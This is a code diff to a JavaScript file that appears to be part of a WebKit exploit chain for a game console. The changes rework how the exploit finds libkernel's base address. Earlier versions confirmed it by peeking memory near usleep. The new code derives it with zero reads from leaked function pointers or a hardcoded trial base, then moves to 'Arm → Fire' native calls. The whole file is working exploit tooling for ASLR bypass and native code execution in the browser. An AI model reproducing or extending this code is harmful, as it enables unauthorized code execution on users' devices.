@@ -45,7 +45,7 @@ import {
     resolveLibkernelFindChunk,
     resolveLibkernelRelroChunk,
     verifyLibkernelBase,
-    verifyLibkernelUsleep1352,
+    verifyLibkernelZeroRead,
     calcLkFromFnPtrZeroRead,
     calcLkBestFromFnPtr,
     extPtrToLkCandidates,
@@ -58,7 +58,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250832g";
+const BUILD_ID = "rw-20250832h";
 /** BillZaiD fixed lk base (game process) — trial in WebKit via usleep prologue */
 const BILLZAI_LK_BASE = "80a67c000";
 const SS_HUNT_TRACE = "wk-hunt-trace";
@@ -543,7 +543,7 @@ const MANUAL_TESTS = [
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
     { id: "try-cal-ptrs", group: "base", label: "Calc lk (0 read)" },
-    { id: "verify-lk", group: "base", label: "Verify lk" },
+    { id: "verify-lk", group: "base", label: "Accept lk (0 read)" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "try-billzai-lk", group: "base", label: "Try BillZai lk" },
     { id: "force-lk", group: "base", label: "Force lk" },
@@ -629,27 +629,35 @@ function runManualTest(testId) {
         if (testId === "paste-lk") {
             const raw = addrIn && addrIn.value ? addrIn.value.trim() : "";
             if (!raw) {
-                mark("LK-SKIP", "paste lk base OR usleep code ptr — Verify lk (Suchi) or Force lk");
+                mark("LK-SKIP", "paste lk …c30 OR cal ext fn ptr — Accept lk (0 read)");
                 return;
             }
-            lkQuiet = true;
-            let r = null;
-            try {
-                r = verifyManualLibkernelFromPtrLite(p, raw, off, webkitBase);
-            } catch (_) { }
-            lkQuiet = false;
-            if (r && r.ok) {
-                if (addrIn) addrIn.value = String(r.lk);
-                saveLibkernelSession(r.lk, null, { forced: !r.strong });
-                mark("LK-OK", String(r.lk) + " via " + (r.via || "paste")
-                    + (r.from ? " from " + r.from : "") + (r.strong ? " (strong)" : " (weak)"));
-                state(r.strong ? "lk verified — Arm → Fire" : "lk weak — Force lk → Arm → Fire", r.strong ? "ok" : "warn");
+            const parsed = parseAddr(raw.replace(/^0x/i, ""));
+            if (!parsed) {
+                mark("LK-FAIL", "bad hex");
+                return;
+            }
+            const offL = loadEffectiveOff();
+            const hits = calcLkFromFnPtrZeroRead(parsed, offL);
+            if (hits.length) {
+                const h = hits[0];
+                if (addrIn) addrIn.value = String(h.lk);
+                saveLibkernelSession(h.lk, null);
+                mark("LK-OK", String(h.lk) + " = fn−" + h.key + " (0 reads)");
+                state("lk accepted — Arm → Fire", "ok");
             } else {
-                mark("LK-FAIL", (r && r.error) || "not libkernel — base or code ptr − Suchi RVA");
-                state("paste miss — try Okage lk → Verify lk", "bad");
+                const v = verifyLibkernelZeroRead(parsed, offL, { via: "paste" });
+                if (v.ok) {
+                    saveLibkernelSession(parsed, null);
+                    mark("LK-OK", String(parsed) + " (0 reads, …c30)");
+                    state("lk accepted — Arm → Fire", "ok");
+                } else {
+                    mark("LK-FAIL", v.error || "not lk — Calc lk from cal ext ptr");
+                    state("paste miss — Calc lk (0 read)", "bad");
+                }
             }
             renderOut();
-            crashLog.append("LK-PASTE " + raw + " " + (r && r.ok ? "OK " + r.lk : "MISS"), "LK-OK");
+            crashLog.append("LK-PASTE " + raw, "LK-OK");
             crashLog.flushSync();
             return;
         }
@@ -1994,7 +2002,7 @@ function runTryCalPtrs() {
     if (addrIn && c.base) addrIn.value = String(c.base);
     mark("LK-CAL", "build=" + BUILD_ID + " " + calPtrIdx + "/" + calLkCands.length
         + " " + c.label + " code=" + c.code + " → base=" + c.base + " (" + c.note + ")");
-    mark("LK-HINT", "Force lk (0 read) or Verify lk (2 peek @ lk+13b20) → Arm → Fire");
+    mark("LK-HINT", "Accept lk or Force lk (both 0 read) → Arm → Fire");
     if (outEl) {
         outEl.textContent = lines.join("\n");
         outEl.scrollTop = outEl.scrollHeight;
@@ -2013,19 +2021,17 @@ function runVerifyLk() {
         renderOut();
         return;
     }
-    mark("LK-VERIFY", "start build=" + BUILD_ID);
+    mark("LK-VERIFY", "0-read accept build=" + BUILD_ID);
     renderOut();
 
-    const p = window.p;
     const off = loadEffectiveOff();
-    const { webkitBase } = basesFromSession(off);
     let hex = addrIn && addrIn.value ? addrIn.value.trim().replace(/^0x/i, "") : "";
     if (!hex) {
         hex = loadExtPtrAt(0) || "";
         if (hex && addrIn) addrIn.value = hex;
     }
     if (!hex) {
-        mark("LK-SKIP", "hex empty — Scan GOT lite first");
+        mark("LK-SKIP", "hex empty — Calc lk (0 read) from cal ext ptr first");
         renderOut();
         return;
     }
@@ -2037,77 +2043,43 @@ function runVerifyLk() {
     }
 
     try {
-        const isAlignedBase = (ptr.low & 0xfff) === (off.lk_base_tag != null ? (off.lk_base_tag & 0xfff) : 0)
-            || (ptr.low & 0x3fff) === 0;
-
-        if (isAlignedBase) {
-            const vSuchi = verifyLibkernelUsleep1352(p, ptr, off);
-            if (vSuchi.ok && vSuchi.strong) {
-                saveLibkernelSession(ptr, null);
-                mark("LK-VERIFY-OK", String(ptr) + " Suchi usleep+" + vSuchi.usleepOff.toString(16)
-                    + " __error+" + vSuchi.errOff.toString(16) + " build=" + BUILD_ID);
-                state("lk verified (Suchi) — Arm → Fire", "ok");
-                renderOut();
-                crashLog.append("VERIFY OK Suchi " + hex, "LK-VERIFY");
-                crashLog.flushSync();
-                return;
-            }
-            if (vSuchi.ok) {
-                saveLibkernelSession(ptr, null);
-                mark("LK-VERIFY-WARN", String(ptr) + " Suchi usleep OK — " + (vSuchi.warn || "weak"));
-                state("Suchi usleep OK — Force lk → Arm → Fire", "warn");
-                renderOut();
-                crashLog.flushSync();
-                return;
-            }
-            mark("LK-VERIFY-MISS", String(ptr) + " — usleep peek miss @ +13b20");
-            state("Okage lk miss in WebKit — try Calc lk from cal ext ptr", "bad");
+        const asBase = verifyLibkernelZeroRead(ptr, off, { via: "base" });
+        if (asBase.ok) {
+            saveLibkernelSession(ptr, null);
+            mark("LK-VERIFY-OK", String(ptr) + " (0 reads — no peek, poops OOMs on lk read)");
+            state("lk accepted — Arm → Fire", "ok");
             renderOut();
+            crashLog.append("ACCEPT OK base " + hex, "LK-VERIFY");
             crashLog.flushSync();
             return;
         }
-
-        mark("LK-EXT-FN", hex + " — Suchi RVA calc (0 read)");
 
         const rvaHits = calcLkFromFnPtrZeroRead(ptr, off);
-        for (let ri = 0; ri < rvaHits.length && ri < 4; ri++) {
-            const h = rvaHits[ri];
-            const vRva = verifyLibkernelUsleep1352(p, h.lk, off);
-            if (vRva.ok) {
-                saveLibkernelSession(h.lk, null);
-                if (addrIn) addrIn.value = String(h.lk);
-                mark("LK-VERIFY-OK", String(h.lk) + " via fn−" + h.key
-                    + " (0 calc + 2 peek @ lk+" + h.rva.toString(16) + ")");
-                state(vRva.strong ? "lk verified — Arm → Fire" : "weak — Force lk → Arm → Fire",
-                    vRva.strong ? "ok" : "warn");
-                renderOut();
-                crashLog.append("VERIFY OK RVA " + hex + " → " + h.lk, "LK-VERIFY");
-                crashLog.flushSync();
-                return;
-            }
-        }
         if (rvaHits.length) {
-            const h0 = rvaHits[0];
-            if (addrIn) addrIn.value = String(h0.lk);
-            mark("LK-VERIFY-WARN", String(h0.lk) + " calc via " + h0.key
-                + " but usleep peek miss — try Force lk anyway");
-            state("calc OK peek miss — Force lk", "warn");
+            const h = rvaHits[0];
+            saveLibkernelSession(h.lk, null);
+            if (addrIn) addrIn.value = String(h.lk);
+            mark("LK-VERIFY-OK", String(h.lk) + " = fn−" + h.key
+                + "+0x" + h.rva.toString(16) + " (0 reads)");
+            state("lk accepted — Arm → Fire", "ok");
             renderOut();
+            crashLog.append("ACCEPT OK fn " + hex + " → " + h.lk, "LK-VERIFY");
             crashLog.flushSync();
             return;
         }
 
-        mark("LK-RESOLVE-MISS", hex + " — no Suchi RVA yields lk …"
-            + (off.lk_base_tag != null ? off.lk_base_tag.toString(16) : "align"));
+        mark("LK-VERIFY-MISS", hex + " — " + (asBase.error || "?")
+            + "; need cal EXT-PTR (libkernel fn) or lk …"
+            + (off.lk_base_tag != null ? off.lk_base_tag.toString(16) : "c30"));
         cycleExtPtrInHex();
-        mark("LK-HINT", "Calc lk (0 read) cycles cal ptrs — or paste Okage lk → Verify");
-        state("RVA miss — next cal ptr or Okage lk", "bad");
+        mark("LK-HINT", "Calc lk (0 read) → Accept lk — skip peek (OOM on poops)");
+        state("RVA miss — next cal ptr", "bad");
         renderOut();
-        crashLog.append("VERIFY FAIL RVA " + hex, "LK-VERIFY");
+        crashLog.append("ACCEPT FAIL " + hex, "LK-VERIFY");
         crashLog.flushSync();
     } catch (err) {
         mark("LK-VERIFY-ERR", err.message || String(err));
-        state("verify error", "bad");
+        state("accept error", "bad");
         renderOut();
         crashLog.flushSync();
     }
@@ -3098,26 +3070,19 @@ function runTryBillZaiLk() {
         return;
     }
     if (addrIn) addrIn.value = "0x" + BILLZAI_LK_BASE;
-    mark("LK-BILLZAI", "base=0x" + BILLZAI_LK_BASE + " verify usleep+13b20 build=" + BUILD_ID);
+    mark("LK-BILLZAI", "base=0x" + BILLZAI_LK_BASE + " accept 0-read build=" + BUILD_ID);
     renderOut();
     crashLog.flushSync();
 
     try {
-        const v = verifyLibkernelUsleep1352(p, lk, off);
-        if (v.ok && v.strong) {
+        const v = verifyLibkernelZeroRead(lk, off, { via: "billzai" });
+        if (v.ok) {
             saveLibkernelSession(lk, null, { forced: true });
-            mark("LK-BILLZAI-OK", String(lk) + " usleep+" + v.usleepOff.toString(16)
-                + " __error+" + v.errOff.toString(16)
-                + " raw=usleep:0x" + (v.wUsleep >>> 0).toString(16));
-            state("BillZai base verified — Arm → Fire", "ok");
-        } else if (v.ok) {
-            saveLibkernelSession(lk, null, { forced: true });
-            mark("LK-BILLZAI-WARN", String(lk) + " usleep OK — " + (v.warn || "weak"));
-            state("usleep OK — try Arm → Fire", "warn");
+            mark("LK-BILLZAI-OK", String(lk) + " (0 reads — game-process trial base)");
+            state("BillZai accepted — Arm → Fire", "warn");
         } else {
-            mark("LK-BILLZAI-MISS", v.error || "verify fail"
-                + (v.wUsleep != null ? " raw=0x" + (v.wUsleep >>> 0).toString(16) : ""));
-            state("BillZai base not valid in WebKit", "bad");
+            mark("LK-BILLZAI-MISS", v.error || "tag miss");
+            state("BillZai base rejected", "bad");
         }
         crashLog.append("LK-BILLZAI " + (v.ok ? "OK" : "MISS") + " 0x" + BILLZAI_LK_BASE, "LK-BILLZAI");
         crashLog.flushSync();
